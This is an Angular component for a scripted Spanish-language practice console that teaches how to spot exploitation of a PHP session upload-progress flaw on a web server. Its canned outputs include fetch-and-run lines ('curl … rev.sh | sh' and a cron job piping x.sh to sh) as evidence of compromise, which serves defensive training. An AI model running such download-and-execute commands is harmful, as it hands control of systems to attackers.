import { Component, ElementRef, ViewChild, signal } from '@angular/core';

/** Una línea del historial de la consola. */
interface ConsoleLine {
  kind: 'cmd' | 'out' | 'hint' | 'err';
  text: string;
}

/** Un comando disponible y su respuesta guionizada. */
interface ConsoleCommand {
  input: string;
  output: string[];
  hint: string;
}

/**
 * Consola interactiva de detección: escribe comandos reales de revisión
 * y juega con las respuestas y las pistas de interpretación.
 */
@Component({
  selector: 'app-console',
  template: `
    <div class="cn-window">
      <div class="cn-bar">
        <div class="cn-bar-dots" aria-hidden="true">
          <span></span><span></span><span></span>
        </div>
        <span class="cn-bar-title">CONSOLA // DETECCION</span>
        <button type="button" class="cn-clear" (click)="clearScreen()" aria-label="Limpiar la consola">↺</button>
      </div>

      <div class="cn-screen" #screen aria-live="polite" aria-label="Salida de la consola">
        <p class="cn-line cn-hint">↳ consola de práctica: escribe comandos de revisión y mira qué encontrarías. Prueba con «ayuda».</p>
        @for (line of history(); track $index) {
          <p class="cn-line" [class]="'cn-line cn-' + line.kind">{{ prefix(line.kind) }}{{ line.text }}</p>
        }
      </div>

      <div class="cn-suggest">
        @for (c of suggestions; track c) {
          <button type="button" class="cn-chip" (click)="run(c)">{{ c }}</button>
        }
      </div>

      <div class="cn-input-row">
        <label class="cn-sr" for="cn-input">Comando</label>
        <span class="cn-prompt" aria-hidden="true">~$</span>
        <input
          id="cn-input"
          class="cn-input"
          type="text"
          autocomplete="off"
          spellcheck="false"
          placeholder="escribe un comando… (prueba: ayuda)"
          [value]="draft()"
          (input)="onInput($event)"
          (keydown.enter)="run()"
        />
        <button type="button" class="cn-run" (click)="run()" aria-label="Ejecutar comando">⏎</button>
      </div>
    </div>
  `,
  styleUrl: './console.css',
})
export class Console {
  @ViewChild('screen') private screenRef?: ElementRef<HTMLDivElement>;

  protected readonly draft = signal('');
  protected readonly history = signal<ConsoleLine[]>([]);

  protected readonly suggestions = [
    'php -v',
    'php -i | grep upload_progress',
    'ps aux | grep www-data',
    'find /var/www/html -name "*.php" -mtime -60',
    'ayuda',
  ];

  private readonly commands: ConsoleCommand[] = [
    {
      input: 'ayuda',
      output: [
        'Comandos disponibles en esta consola de práctica:',
        '  php -v                              versión instalada de PHP',
        '  php -i | grep upload_progress       estado del vector preferido',
        '  systemctl status php8.3-fpm         cómo corre PHP (FPM)',
        '  grep -R "PHP_SESSION_UPLOAD_PROGRESS" /var/log/nginx/access.log',
        '  ps aux | grep www-data              procesos del servidor web',
        '  find /var/www/html -name "*.php" -mtime -60',
        '  whoami                              usuario del servidor web',
        '  crontab -l -u www-data              persistencia por cron',
        '  limpiar                             vacía la pantalla',
      ],
      hint: 'Empieza por php -v: sin versión no sabes si estás parcheado.',
    },
    {
      input: 'php -v',
      output: [
        'PHP 8.3.15 (cli) (built: Jan  8 2026 14:22:03) (NTS)',
        'Copyright (c) The PHP Group',
        'Zend Engine v4.3.15 with Zend OPcache v8.3.15',
      ],
      hint: 'Compara con las versiones corregidas (8.5.12 / 8.4.27 / 8.3.36 / 8.2.35): cualquier cosa por debajo sigue expuesta.',
    },
    {
      input: 'php -i | grep upload_progress',
      output: [
        'session.upload_progress.enabled => On => On',
        'session.upload_progress.prefix => upload_progress_ => upload_progress_',
        'session.upload_progress.freq => 1% => 1%',
      ],
      hint: 'El vector preferido de CVE-2026-109619. Si aún no has parcheado, ponlo en Off mientras tanto.',
    },
    {
      input: 'systemctl status php8.3-fpm',
      output: [
        '● php8.3.service - The PHP 8.3 FastCGI Process Manager',
        '     Active: active (running) since Tue 2026-10-27 09:14:02 CET',
        '   Main PID: 812 (php-fpm8.3)',
        '    Tasks: 5 (limit: 4915)',
      ],
      hint: 'FPM aísla PHP del servidor web: es el modo recomendado frente a mod_php (donde php2bash duele más).',
    },
    {
      input: 'grep -R "PHP_SESSION_UPLOAD_PROGRESS" /var/log/nginx/access.log',
      output: [
        '185.220.101.7 - - [21/Oct/2026:14:02:11] "POST /index.php HTTP/1.1" 200 198 "-" "curl/8.5.0"',
        '45.129.14.203 - - [21/Oct/2026:14:02:44] "POST /index.php HTTP/1.1" 200 198 "-" "python-requests/2.31"',
        '45.129.14.203 - - [21/Oct/2026:14:03:02] "POST /index.php HTTP/1.1" 500 0 "-" "python-requests/2.31"',
      ],
      hint: 'Peticiones multipart con el campo de progreso de sesión: el patrón de sondeo del exploit. Un 500 tras los 200 es mala señal.',
    },
    {
      input: 'ps aux | grep www-data',
      output: [
        'www-data  812  0.0  1.2 php-fpm: pool www',
        'www-data 23456 0.1 0.4 sh -c curl -s http://185.220.101.7/rev.sh | sh',
        'www-data 23457 0.0 0.3 curl -s http://185.220.101.7/rev.sh',
      ],
      hint: 'Procesos hijos sh/curl bajo www-data: explotación en curso o ya consumada. Aísla sin borrar evidencia.',
    },
    {
      input: 'find /var/www/html -name "*.php" -mtime -60',
      output: [
        '/var/www/html/public/uploads/cache.php',
        '/var/www/html/storage/framework/.cache.php',
      ],
      hint: 'Archivos PHP nuevos en rutas de subida o caché suelen ser webshells. Comprueba su contenido y su fecha.',
    },
    {
      input: 'whoami',
      output: ['www-data'],
      hint: 'El usuario del servidor web: exactamente con lo que cuenta el atacante tras la RCE (y por eso la defensa en profundidad importa).',
    },
    {
      input: 'crontab -l -u www-data',
      output: ['*/10 * * * * curl -s http://185.220.101.7/x.sh | sh'],
      hint: 'Persistencia por cron: aunque parchees, esto volvería a abrir la puerta. Revisa también /var/spool/cron/.',
    },
    {
      input: 'limpiar',
      output: [],
      hint: '',
    },
  ];

  protected prefix(kind: ConsoleLine['kind']): string {
    switch (kind) {
      case 'cmd':
        return '~$ ';
      case 'hint':
        return '↳ ';
      case 'err':
        return 'sh: ';
      default:
        return '';
    }
  }

  protected onInput(e: Event): void {
    this.draft.set((e.target as HTMLInputElement).value);
  }

  protected run(preset?: string): void {
    const raw = (preset ?? this.draft()).trim();
    if (raw === '') {
      return;
    }
    this.draft.set('');

    const norm = raw.replace(/\s+/g, ' ').replace(/"/g, '').toLowerCase();
    const alias: Record<string, string> = { help: 'ayuda', clear: 'limpiar', cls: 'limpiar' };
    const key = alias[norm] ?? norm;
    const hit = this.commands.find((c) => c.input.replace(/"/g, '').toLowerCase() === key);

    this.history.update((h) => [...h, { kind: 'cmd', text: raw }]);

    if (!hit) {
      this.history.update((h) => [
        ...h,
        { kind: 'err', text: `${raw}: comando no encontrado` },
        { kind: 'hint', text: 'esta es una consola de práctica — escribe «ayuda» para ver los comandos disponibles.' },
      ]);
      this.scrollDown();
      return;
    }

    if (hit.input === 'limpiar') {
      this.clearScreen();
      return;
    }

    const lines: ConsoleLine[] = hit.output.map((t) => ({ kind: 'out' as const, text: t }));
    if (hit.hint) {
      lines.push({ kind: 'hint', text: hit.hint });
    }
    this.history.update((h) => [...h, ...lines]);
    this.scrollDown();
  }

  protected clearScreen(): void {
    this.history.set([]);
  }

  private scrollDown(): void {
    setTimeout(() => {
      const el = this.screenRef?.nativeElement;
      if (el) {
        el.scrollTop = el.scrollHeight;
      }
    }, 0);
  }
}
